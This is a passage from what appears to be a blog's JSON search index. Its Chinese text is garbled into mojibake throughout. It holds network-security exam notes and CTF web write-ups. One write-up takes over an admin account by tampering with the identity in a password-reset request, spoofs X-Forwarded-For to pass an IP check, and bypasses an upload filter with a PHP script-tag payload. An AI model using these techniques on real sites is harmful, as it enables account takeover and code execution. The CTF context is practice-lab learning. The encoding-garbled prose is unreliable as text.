ä½“ç³»å¯ä»¥æœ‰å¤šç§ä¸åŒçš„ä½“ç³»ç»“æ„ã€å®ç°æ–¹æ³•å’Œé€šä¿¡åè®®ã€‚ 37.æŒ‘æˆ˜ç›¸åº”æœºåˆ¶**é¡¾åæ€ä¹‰ï¼ŒåŸºäºæŒ‘æˆ˜/åº”ç­”ï¼ˆChallenge/Responseï¼‰æ–¹å¼çš„èº«ä»½è®¤è¯ç³»ç»Ÿå°±æ˜¯æ¯æ¬¡è®¤è¯æ—¶è®¤è¯æœåŠ¡å™¨ç«¯éƒ½ç»™å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªä¸åŒçš„â€æŒ‘æˆ˜â€å­—ä¸²ï¼Œå®¢æˆ·ç«¯ç¨‹åºæ”¶åˆ°è¿™ä¸ªâ€æŒ‘æˆ˜â€å­—ä¸²åï¼Œåšå‡ºç›¸åº”çš„â€åº”ç­”â€,ä»¥æ­¤æœºåˆ¶è€Œç ”åˆ¶çš„ç³»ç»Ÿ.è®¤è¯è¿‡ç¨‹ï¼š1) å®¢æˆ·å‘è®¤è¯æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè¦æ±‚è¿›è¡Œèº«ä»½è®¤è¯ï¼›2) è®¤è¯æœåŠ¡å™¨ä»ç”¨æˆ·æ•°æ®åº“ä¸­æŸ¥è¯¢ç”¨æˆ·æ˜¯å¦æ˜¯åˆæ³•çš„ç”¨æˆ·ï¼Œè‹¥ä¸æ˜¯ï¼Œåˆ™ä¸åšè¿›ä¸€æ­¥å¤„ç†ï¼›3) è®¤è¯æœåŠ¡å™¨å†…éƒ¨äº§ç”Ÿä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºâ€æé—®â€ï¼Œå‘é€ç»™å®¢æˆ·ï¼›4) å®¢æˆ·å°†ç”¨æˆ·åå­—å’Œéšæœºæ•°åˆå¹¶ï¼Œä½¿ç”¨å•å‘Hashå‡½æ•°ï¼ˆä¾‹å¦‚MD5ç®—æ³•ï¼‰ç”Ÿæˆä¸€ä¸ªå­—èŠ‚ä¸²ä½œä¸ºåº”ç­”ï¼›5) è®¤è¯æœåŠ¡å™¨å°†åº”ç­”ä¸²ä¸è‡ªå·±çš„è®¡ç®—ç»“æœæ¯”è¾ƒï¼Œè‹¥äºŒè€…ç›¸åŒï¼Œåˆ™é€šè¿‡ä¸€æ¬¡è®¤è¯ï¼›å¦åˆ™ï¼Œè®¤è¯å¤±è´¥ï¼›6) è®¤è¯æœåŠ¡å™¨é€šçŸ¥å®¢æˆ·è®¤è¯æˆåŠŸæˆ–å¤±è´¥ã€‚ä»¥åçš„è®¤è¯ç”±å®¢æˆ·ä¸å®šæ—¶åœ°å‘èµ·ï¼Œè¿‡ç¨‹ä¸­æ²¡æœ‰äº†å®¢æˆ·è®¤è¯è¯·æ±‚ä¸€æ­¥ã€‚ä¸¤æ¬¡è®¤è¯çš„æ—¶é—´é—´çš„å¯†é’¥éš”ä¸èƒ½å¤ªçŸ­ï¼Œå¦åˆ™å°±ç»™ç½‘ç»œã€å®¢æˆ·å’Œè®¤è¯æœåŠ¡å™¨å¸¦æ¥å¤ªå¤§çš„å¼€é”€ï¼›ä¹Ÿä¸èƒ½å¤ªé•¿ï¼Œå¦åˆ™ä¸èƒ½ä¿è¯ç”¨æˆ·ä¸è¢«ä»–äººç›—ç”¨IPåœ°å€ï¼Œä¸€èˆ¬å®šä¸º1-2åˆ†é’Ÿã€‚ è®¿é—®æ§åˆ¶38.è®¿é—®æ§åˆ¶çš„æ¦‚å¿µå°±æ˜¯åœ¨èº«ä»½è®¤è¯çš„åŸºç¡€ä¸Šï¼Œä¾æ®æˆæƒå¯¹å¯¹æå‡ºçš„èµ„æºè®¿é—®è¯·æ±‚åŠ ä»¥æ§åˆ¶ï¼›éµå¾ªåŸåˆ™ï¼š1.æœ€å°ç‰¹æƒåŸåˆ™2.å¤šäººè´Ÿè´£åŸåˆ™(å³æˆæƒåˆ†æ•£åŒ–)3.èŒè´£åˆ†ç¦»åŸåˆ™ 39.å¸¸è§çš„è®¿é—®æ§åˆ¶çš„æ¨¡å‹1.è‡ªä¸»è®¿é—®æ§åˆ¶DAC2.å¼ºåˆ¶è®¿é—®æ§åˆ¶MAC3.åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶RBAC4.åŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ABAC 40.è®¿é—®æ§åˆ¶æœºåˆ¶æŒ‡å¯¹ä¸»ä½“è®¿é—®å®¢ä½“çš„æƒåŠ›æˆ–èƒ½åŠ›çš„é™åˆ¶ï¼Œä»¥åŠé™åˆ¶è¿›å…¥ç‰©ç†åŒºåŸŸ(å‡ºå…¥æ§åˆ¶)å’Œé™åˆ¶ä½¿ç”¨è®¡ç®—æœºç³»ç»Ÿå’Œè®¡ç®—æœºå­˜å–æ•°æ®çš„è¿‡ç¨‹(å­˜å–æ§åˆ¶)ã€‚ 41.è®¡ç®—æœºå®‰å…¨å½¢å¼åŒ–æ¨¡å‹éªŒè¯å®‰å…¨è®¾è®¡ä¸å®ç°ï¼› 1.Bell-LaPadulaæ¨¡å‹2.Bibaæ¨¡å‹é˜²ç«å¢™ä¸å…¥ä¾µæ£€æµ‹42.é˜²ç«å¢™çš„åŸºæœ¬åŸç†é˜²ç«å¢™æŠ€æœ¯æ˜¯é€šè¿‡æœ‰æœºç»“åˆå„ç±»ç”¨äºå®‰å…¨ç®¡ç†ä¸ç­›é€‰çš„è½¯ä»¶å’Œç¡¬ä»¶è®¾å¤‡ï¼Œå¸®åŠ©è®¡ç®—æœºç½‘ç»œäºå…¶å†…ã€å¤–ç½‘ä¹‹é—´æ„å»ºä¸€é“ç›¸å¯¹éš”ç»çš„ä¿æŠ¤å±éšœï¼Œä»¥ä¿æŠ¤ç”¨æˆ·èµ„æ–™ä¸ä¿¡æ¯å®‰å…¨æ€§çš„ä¸€ç§æŠ€æœ¯ã€‚é˜²ç«å¢™æŠ€æœ¯çš„åŠŸèƒ½ä¸»è¦åœ¨äºåŠæ—¶å‘ç°å¹¶å¤„ç†è®¡ç®—æœºç½‘ç»œè¿è¡Œæ—¶å¯èƒ½å­˜åœ¨çš„å®‰å…¨é£é™©ã€æ•°æ®ä¼ è¾“ç­‰é—®é¢˜ï¼Œå…¶ä¸­å¤„ç†æªæ–½åŒ…æ‹¬éš”ç¦»ä¸ä¿æŠ¤ï¼ŒåŒæ—¶å¯å¯¹è®¡ç®—æœºç½‘ç»œå®‰å…¨å½“ä¸­çš„å„é¡¹æ“ä½œå®æ–½è®°å½•ä¸æ£€æµ‹ï¼Œä»¥ç¡®ä¿è®¡ç®—æœºç½‘ç»œè¿è¡Œçš„å®‰å…¨æ€§ï¼Œä¿éšœç”¨æˆ·èµ„æ–™ä¸ä¿¡æ¯çš„å®Œæ•´æ€§ï¼Œä¸ºç”¨æˆ·æä¾›æ›´å¥½ã€æ›´å®‰å…¨çš„è®¡ç®—æœºç½‘ç»œä½¿ç”¨ä½“éªŒã€‚ 1.é™åˆ¶äººä»¬ä»ä¸€ä¸ªç‰¹åˆ«çš„æ§åˆ¶ç‚¹è¿›å…¥ï¼Œä»è€Œé˜²æ­¢å…¥ä¾µè€…æ¥è¿‘å†…éƒ¨è®¾æ–½ï¼›2.é™å®šäººä»¬ä»ä¸€ä¸ªç‰¹åˆ«çš„ç‚¹ç¦»å¼€ï¼Œä»è€Œæœ‰æ•ˆçš„ä¿æŠ¤å†…éƒ¨èµ„æºï¼› 43.é˜²ç«å¢™æŠ€æœ¯åˆ†ç±»1.åŒ…è¿‡æ»¤é˜²ç«å¢™/è·¯ç”±å™¨ï¼ˆé™æ€/åŠ¨æ€ï¼‰å·¥ä½œåœ¨ç½‘ç»œå±‚/ä¼ è¾“å±‚ï¼› 2.ä»£ç†æŠ€æœ¯(åº”ç”¨å±‚/ç”µè·¯çº§) 3.æ··åˆå‹44.é˜²ç«å¢™çš„é…ç½®æ–¹æ¡ˆ1.å±è”½è·¯ç”±å™¨2.åŒå®¿ä¸»æœº3.å±è”½ä¸»æœº4.å±è”½å­ç½‘45.å…¥ä¾µæ£€æµ‹çš„åˆ†ç±»åŠå·¥ä½œåŸç†åˆ†ç±»ï¼š1.åŸºäºä¸»æœºçš„å…¥ä¾µæ£€æµ‹ç³»ç»ŸHIDSé€šè¿‡ç›‘è§†ä¸åˆ†æä¸»æœºçš„å®¡è®¡è®°å½•æ£€æµ‹å…¥ä¾µï¼›åŸç†:å®‰è£…åœ¨è¢«æ£€æµ‹çš„ä¸»æœºä¹‹ä¸Šï¼Œä¸»è¦æ˜¯å¯¹è¯¥ä¸»æœºçš„ç½‘ç»œå®æ—¶è¿æ¥ä»¥åŠç³»ç»Ÿå®¡è®¡æ—¥å¿—è¿›è¡Œæ™ºèƒ½åˆ†æå’Œåˆ¤æ–­ï¼›(æ›´å¥½çš„è¾¨è¯†åˆ†æã€æˆæœ¬ä½/æ…¢) 2.åŸºäºç½‘ç»œçš„å…¥ä¾µæ£€æµ‹ç³»ç»ŸNIDSé€šè¿‡åœ¨å…±äº«ç½‘æ®µä¸Šå¯¹é€šä¿¡æ•°æ®çš„ä¾¦å¬é‡‡é›†æ•°æ®ï¼Œåˆ†æå¯ç–‘ç°è±¡ï¼›åŸç†ï¼šæ”¾ç½®åœ¨æ¯”è¾ƒé‡è¦çš„ç½‘æ®µå†…ï¼Œä¸åœçš„ç›‘è§†ç½‘æ®µä¸­å„ç§æ•°æ®åŒ…ã€‚å¹¶å¯¹æ¯ä¸ªæ•°æ®åŒ…è¿›è¡Œç‰¹å¾åˆ†æï¼Œåˆ¤æ–­æ˜¯å¦ä¸ç³»ç»Ÿå†…ç½®çš„æŸäº›è§„åˆ™å»åˆï¼›(æˆæœ¬ä½ã€å®æ—¶/åªèƒ½æ£€æŸ¥ç›´è¿ç½‘æ®µã€æ•°æ®é‡å¤§ã€å¤æ‚æ£€æµ‹å›°éš¾) 3.åˆ†å¸ƒå¼å…¥ä¾µæ£€æµ‹ç³»ç»Ÿæ£€æµ‹ç½‘ç»œä¸­çš„æ•°æ®åŒ…ï¼Œä¸NIDSä¸åŒç‚¹ï¼šé‡‡ç”¨åˆ†å¸ƒå¼æ£€æµ‹ï¼Œé›†ä¸­ç®¡ç†(èŒƒå›´å¹¿/å½±å“æµé‡) VPN46.VPNçš„æ¦‚å¿µæŒ‡çš„æ˜¯åœ¨å…¬ç”¨ç½‘ç»œä¸Šåˆ©ç”¨åŠ å¯†ä¸æ§åˆ¶è®¿é—®æŠ€æœ¯å»ºç«‹ä¸“ç”¨ç½‘ç»œçš„æŠ€æœ¯ï¼›åˆ†ç±»1(æŒ‰åœºåˆ)ï¼š1.è¿œç¨‹è®¿é—®VPN2.ç½‘å…³-ç½‘å…³VPNä¸»è¦æŠ€æœ¯ï¼šéš§é“æŠ€æœ¯ã€åŠ å¯†æŠ€æœ¯éš§é“ï¼šå°†ä¸€ç§åè®®çš„æ•°æ®åˆ†è£…åˆ°å¦ä¸€ç§åè®®ä¸­è¿›è¡Œä¼ è¾“çš„æŠ€æœ¯åŠ å¯†ï¼šä¿æŠ¤éš§é“ä¸­æ•°æ®çš„å®‰å…¨ä¼ è¾“åˆ†ç±»2(æŒ‰éš§é“åè®®çš„å®ç°å±‚æ¬¡)ï¼š1.ç¬¬äºŒå±‚éš§é“åè®®ä¸»è¦ï¼šç‚¹åˆ°ç‚¹ï¼Œå®ç°è¿œç¨‹è®¿é—®VPN2.ç¬¬ä¸‰å±‚éš§é“åè®®ä¸»è¦ï¼šIPå®‰å…¨ï¼Œç”¨äºç½‘å…³-ç½‘å…³VPNï¼Œå®ç°è¿œç¨‹è®¿é—®VPN3.ç¬¬å››å±‚éš§é“åè®®å¤„äºä¼ è¾“å±‚å’Œåº”ç”¨å±‚ä¹‹å‰çš„ä¸€ä¸ªå®‰å…¨å­å±‚ï¼›SSL/TLSï¼›HTTPS 47.IPSec VPNï¼š(ç†Ÿè®°) IPSec:ç”¨äºæ„å»ºVPNçš„ä¸€ç³»åˆ—åè®®ï¼Œæ­£åœ¨æˆä¸ºåˆ›å»ºVPNçš„æ ‡å‡† åŠŸèƒ½IPSecåªå…è®¸IPæ•°æ®çš„å°è£…å’ŒåŠ å¯†åŸºäºç«¯å¯¹ç«¯çš„å®‰å…¨æ¨¡å¼ï¼Œåœ¨æºIPå’Œç›®çš„IPåœ°å€ä¹‹é—´å»ºç«‹ä¿¡ä»»å’Œå®‰å…¨æ€§ï¼›IPSecå¯ä¿éšœä¸»æœºä¹‹é—´ã€ç½‘ç»œå®‰å…¨ç½‘å…³(å¦‚è·¯ç”±å™¨æˆ–é˜²ç«å¢™)ä¹‹é—´æˆ–ä¸»æœºä¸å®‰å…¨ç½‘ç®¡ä¹‹é—´çš„æ•°æ®åŒ…å®‰å…¨ï¼›å¯é˜²èŒƒï¼šæ•°æ®å—…æ¢ã€æ•°æ®ç¯¡æ”¹ã€èº«ä»½æ¬ºéª—ã€é‡æ”¾æ”»å‡»ã€æ‹’ç»æœåŠ¡æ”»å‡»åŠŸèƒ½ï¼šè®¿é—®æ§åˆ¶ã€æ— è¿æ¥çš„å®Œæ•´æ€§ã€æ•°æ®æºè®¤è¯ã€é˜²æ­¢é‡å¤æ”»å‡»ã€æœºå¯†æ€§(åŠ å¯†) ä½“ç³»ç»“æ„IPSecåè®®ä½“ç³»ä¸»è¦åŒ…å«8éƒ¨åˆ†ï¼š1.IPå®‰å…¨ä½“ç³»ç»“æ„2.å°è£…å®‰å…¨è½½è·3.éªŒè¯å¤´4.åŠ å¯†ç®—æ³•5.è®¤è¯ç®—æ³•6.å¯†é’¥ç®¡ç†7.è§£é‡ŠåŸŸ8.ç­–ç•¥ ç»„æˆ1.Internetå¯†é’¥äº¤æ¢åè®®(IKE)&lt;æä¾›åå•†å®‰å…¨å‚æ•°å’Œåˆ›å»ºè®¤è¯å¯†é’¥&gt;2.å°è£…åè®®ï¼š(1)è´Ÿè½½å®‰å…¨å°è£…ESPï¼šæä¾›åŠ å¯†ã€è®¤è¯å’Œæ•°æ®ä¿æŠ¤(2)è®¤è¯æŠ¥å¤´åè®®AHï¼šæä¾›è®¤è¯å’Œæ•°æ®ä¿æŠ¤ å·¥ä½œæ¨¡å¼ä¼ è¾“æ¨¡å¼ï¼šä¸¤å°ä¸»æœºä¹‹é—´(ç‚¹åˆ°ç‚¹)ä¼ é€’çš„æ•°æ®åŠ å¯†éš§é“æ¨¡å¼ï¼šä¸¤ä¸ªä¸åŒç½‘æ®µ(ç«™ç‚¹åˆ°ç«™ç‚¹)ä¼ é€çš„æ•°æ®å†…å®¹åŠ å¯†æˆ–è€…ä¸¤ä¸ªç§æœ‰IPç½‘æ®µç©¿è¶ŠInternetè¿æ¥åŒºåˆ«ï¼šæ•°æ®åŒ…åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦éœ€è¦æ›´æ”¹IPæŠ¥å¤´ å·¥ä½œè¿‡ç¨‹çš„3ä¸ªé˜¶æ®µ1.IPSecå¯åŠ¨2.IKE SA(IKEé˜¶æ®µ1â€“ä¸»æ¨¡å¼)3.IPSec SA(IKEé˜¶æ®µ2â€“å¿«é€Ÿæ¨¡å¼) æ•°æ®åŒ…å°è£…ç”±ESPæˆ–AHæˆ–ä¸¤ç§å…±åŒå¤„ç†AHï¼šä¸ºIPæ•°æ®æŠ¥æä¾›æ— è¿æ¥çš„å®Œæ•´æ€§å’Œæ•°æ®æºè®¤è¯çš„æœºåˆ¶ESPï¼šæä¾›äº†AHçš„å¤§éƒ¨åˆ†ä¿æŠ¤åŠ ä¸Šé¢å¤–çš„æœºå¯†æ€§(ä½¿ç”¨DESã€3DESã€AESã€RC5ã€IDEA)ä¸€èˆ¬æƒ…å†µä¸‹ä½¿ç”¨ESP IKE(ç†Ÿè®°)å·¥ä½œé˜¶æ®µåŠå†…å®¹å› ç‰¹ç½‘å¯†é’¥äº¤æ¢åè®®ï¼š*ç”¨äºåå•†IPSecå®‰å…¨å…³è”ï¼Œè¦æ±‚IPSecç³»ç»Ÿé¦–å…ˆè¿›è¡Œèº«ä»½è®¤è¯ï¼Œå¹¶å»ºç«‹ISAKMPæˆ–IKEå…±äº«å¯†é’¥*SAåŒ…æ‹¬ä¸¤ç±»ï¼š1.IKE SAï¼šåŒå‘2.IPSec SAï¼šå•å‘çš„-&gt;å»ºç«‹åŒå‘VPNéœ€è¦ä¸¤ä¸ªSAä¸»è¦è´Ÿè´£ï¼š*åå•†åè®®çš„å‚æ•°*äº¤æ¢å…¬å…±å¯†é’¥*å¯¹åŒæ–¹è¿›è¡ŒéªŒè¯*åœ¨äº¤æ¢åå¯¹å¯†é’¥è¿›è¡Œç®¡ç† å®‰å…¨å…³è”SASAï¼šä»£è¡¨ä¸¤å¯¹ç­‰ä½“æˆ–ä¸¤ä¸»æœºä¹‹é—´çš„å¥‘çº¦ï¼Œæè¿°å¯¹ç­‰ä½“å°†æ€æ ·ä½¿ç”¨IPSecå®‰å…¨æœåŠ¡æ¥ä¿æŠ¤ç½‘ç»œæµé‡ï¼›","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"Bug","slug":"Bug","date":"2019-12-09T01:18:21.000Z","updated":"2019-12-30T05:56:55.442Z","comments":true,"path":"2019/12/09/Bug/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Bug/","excerpt":"","text":"bugé¢˜ç›®åˆ†æï¼šç»™å‡ºä¸€ä¸ªç™»å½•é¡µé¢;é¦–å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼› ç™»å½•ï¼› å‘ç°åªæœ‰Manageæ˜¯ä¸èƒ½æ™®é€šç”¨æˆ·ä½¿ç”¨çš„ï¼› æœ€åå‘ç°è¿˜æœ‰ä¸ªFinpwdï¼Œæ‰¾å›å¯†ç ä¹‹å‰åº”è¯¥ä¼šéªŒè¯èº«ä»½ï¼Œåº”è¯¥æ˜¯çªç ´å£ï¼› å®é™…æ“ä½œï¼šå…ˆä»¥smtsecæ‰¾å›å¯†ç ï¼Œå‘ç°ç›´æ¥ç»™äº†ä¸€ä¸ªnewpwdè¾“å…¥æ¡†ï¼›åº”è¯¥æ˜¯éœ€è¦æŠ“åŒ…ä¿®æ”¹ç”¨æˆ·èº«ä»½ï¼› ä¿®æ”¹ä¸ºadminï¼Œæç¤ºä¿®æ”¹æˆåŠŸï¼› ä»¥adminèº«ä»½ç™»å½•æˆåŠŸï¼›ä½†æ˜¯Manageè¿˜æ˜¯ä¸èƒ½ä½¿ç”¨æç¤ºIP not allowed!åº”è¯¥è¦æ”¹ä¸ºæœ¬åœ°ç™»å½•ï¼›åœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥X-Forwarded-For: 127.0.0.1è¿›è¡Œipä¼ªé€ ï¼›å¾—åˆ°å¦‚ä¸‹é¡µé¢ï¼› æŸ¥çœ‹æºç ï¼Œçœ‹åˆ°æç¤ºï¼š çœ‹åˆ°filemanageæƒ³åˆ°å¯èƒ½doä¸ºupload(æ–‡ä»¶ç®¡ç†æ— éä¸Šä¼ ã€ä¸‹è½½ã€æŸ¥çœ‹ã€åˆ é™¤)ï¼› å…³äºæ–‡ä»¶ä¸Šä¼ ï¼šhttps://blog.csdn.net/qq_42636435/article/details/88096844 æ ¹æ®æç¤ºJust imageï¼Ÿå› è¯¥æ˜¯ä¸Šä¼ imageç„¶åæ”¹åç¼€ï¼› æ„é€ ï¼š 123&lt;ï¼Ÿphp phpinfo();ï¼Ÿ&gt; ä¸Šä¼ å‘ç°ï¼Œè¿‡æ»¤äº†;ä¸æ˜¯phpæ–‡ä»¶åˆä¸èƒ½è¿›è¡Œè§£æå¾—åˆ°å“åº”ï¼›éphpæ–‡ä»¶ä¸‹æç¤ºè¦ä¸Šä¼ phpæ–‡ä»¶ï¼›It is not a really php fileè¿™é‡Œå°è¯•ä½¿ç”¨phpçš„è„šæœ¬è¡¨è¾¾å½¢å¼ 123&lt;script language='php'&gt;phpinfo();&lt;/script&gt; å°†jpgåç¼€æ”¹ä¸ºphp4/php5;(å¦åˆ™ä¸èƒ½è§£æ)å°±å¾—åˆ°å“åº”flagäº†.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"NaNNaNNaNNaN-Batman","slug":"NaNNaNNaNNaN-Batman","date":"2019-12-09T01:08:23.000Z","updated":"2019-12-30T05:53:52.682Z","comments":true,"path":"2019/12/09/NaNNaNNaNNaN-Batman/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/NaNNaNNaNNaN-Batman/","excerpt":"","text":"NaNNaNNaNNaN-Batmané¢˜ç›®åˆ†æï¼šä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ°web100çš„æ–‡æœ¬ï¼Œæ‰“å¼€æ˜¯ä¹±ç ï¼Œå¤§æ¦‚çœ‹äº†ä¸‹ï¼Œå°†åç¼€æ”¹ä¸ºHTMLï¼Œåœ¨æµè§ˆå™¨é‡Œæ‰“å¼€ï¼Œå¾—åˆ°ä¸€ä¸ªOKè¾“å…¥æ¡†ï¼› ä½†æ˜¯è¾“å…¥æ²¡æœ‰ä»»ä½•å“åº”ï¼›å›å¤´å†çœ‹çœ‹ä»£ç ï¼› å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°,â€™â€™æ˜¯ä¸€ä¸ªå˜é‡ï¼Œè€Œå®ƒçš„å†…å®¹å°±æ˜¯åé¢ä¸€é•¿ä¸²å­—ç¬¦(ä¸‰è¡Œç»¿è‰²éƒ¨åˆ†å³â€™â€™ä¸­é—´éƒ¨åˆ†)ï¼›æœ€åeval()å‡½æ•°æ‰§è¡Œ_; **eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚**æ­¤å¤„ï¼Œeval()å¹¶æœªæ‰§è¡Œ$()å‡½æ•°ï¼Œè€Œæ˜¯æ‰§è¡Œäº†å­—ç¬¦ä¸²ï¼Œå¯¼è‡´ä¹±ç ?:).ä¸ºäº†èƒ½çœ‹åˆ°æ­£å¸¸æºç ï¼Œå°†eval()æ”¹ä¸ºalert()ï¼› **alert() æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¸¦æœ‰ä¸€æ¡æŒ‡å®šæ¶ˆæ¯å’Œä¸€ä¸ª OK æŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚alertæ˜¯HTML DOM ä¸­ç”¨åˆ°çš„ä¸€ç§è„šæœ¬è¯­è¨€ï¼Œå®ƒçš„ä¸­æ–‡æ„æ€æ˜¯â€œæé†’â€ã€‚å®ƒæ˜¯JavaScriptæˆ–VBscriptè„šæœ¬è¯­è¨€ä¸­çª—å£windowå¯¹è±¡çš„ä¸€ä¸ªå¸¸ç”¨æ–¹æ³•ï¼›å…¶ä¸»è¦ç”¨æ³•å°±æ˜¯åœ¨ä½ è‡ªå·±å®šä¹‰äº†ä¸€å®šçš„å‡½æ•°ä»¥åï¼Œé€šè¿‡æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼Œæ‰€å¼¹å‡ºå¯¹è¯æ¡†çš„è¯­è¨€ã€‚å¹¶ä¸”alertå¯¹è¯æ¡†é€šå¸¸ç”¨äºä¸€äº›å¯¹ç”¨æˆ·çš„æç¤ºä¿¡æ¯ã€‚|alert(message)| ||:â€”â€”â€“:|:â€”â€”â€”â€”-:||å‚æ•° |æè¿°||message |è¦åœ¨ window ä¸Šå¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºçš„çº¯æ–‡æœ¬ï¼ˆè€Œé HTML æ–‡æœ¬ï¼‰|** å³ï¼š 1234567891011121314151617181920212223function $()&#123; var e=document.getElementById(\"c\").value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null) &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _ **match() æ–¹æ³•å¯åœ¨å­—ç¬¦ä¸²å†…æ£€ç´¢æŒ‡å®šçš„å€¼ï¼Œæˆ–æ‰¾åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…ã€‚splice() æ–¹æ³•å‘/ä»æ•°ç»„ä¸­æ·»åŠ /åˆ é™¤é¡¹ç›®ï¼Œç„¶åè¿”å›è¢«åˆ é™¤çš„é¡¹ç›®ã€‚(åº”è¯¥æ˜¯ä»varåçš„å‡ ä¸ªå€¼ä¸­æŒ‘é€‰å‡ ä¸ªï¼Œç»„åˆå¾—åˆ°flag)** å®é™…æ“ä½œï¼š æ–¹æ³•ä¸€ï¼šå®¡è®¡ï¼Œå˜é‡eéœ€è¦æ»¡è¶³äº”ä¸ªæ¡ä»¶ã€‚é•¿åº¦ä¸º16ï¼›^è¡¨ç¤ºå¼€å¤´ä¸€å®šè¦åŒ¹é…åˆ°be0f23ï¼Œ$è¡¨ç¤ºç»“å°¾ä¸€å®šè¦åŒ¹é…åˆ°e98aa,å…¶å®ƒçš„åªè¦åŒ¹é…åˆ°å°±è¡Œï¼Œæ²¡æœ‰ä½ç½®è¦æ±‚ï¼›æ‰€ä»¥å¯ä»¥æ„é€ å‡ºï¼še==be0f233ac7be98aaåœ¨OKè¾“å…¥æ¡†ä¸­è¾“å…¥å¯ä»¥å¾—åˆ°flagï¼› æ–¹æ³•äºŒï¼šç”±äºç¨‹åºå·²ç»å›ºå®šåªæ˜¯åœ¨è¾“å…¥æ—¶éœ€è¦æ£€æµ‹æ˜¯å¦åŒ¹é…ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥çœå»è¾“å…¥åŒ¹é…éƒ¨åˆ†ï¼Œç›´æ¥æ‰§è¡Œå…³é”®ç»„åˆflagéƒ¨åˆ†ï¼›æå–å¦‚ä¸‹ä»£ç ï¼Œåœ¨æ§åˆ¶å°æ‰§è¡Œï¼š 123456789101112131415161718function $()&#123; var e=document.getElementById(\"c\").value; &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Training-WWW-Robots","slug":"Training-WWW-Robots","date":"2019-12-09T01:03:58.000Z","updated":"2019-12-30T05:50:13.720Z","comments":true,"path":"2019/12/09/Training-WWW-Robots/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Training-WWW-Robots/","excerpt":"","text":"Training-WWW-RobotsçŸ¥è¯†ç‚¹è¡¥å……ï¼š robots.txtæ˜¯ä¸€ä¸ªåè®®ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ã€‚robots.txtæ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚robots.txtæ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚ å½“ä¸€ä¸ªæœç´¢èœ˜è››è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ 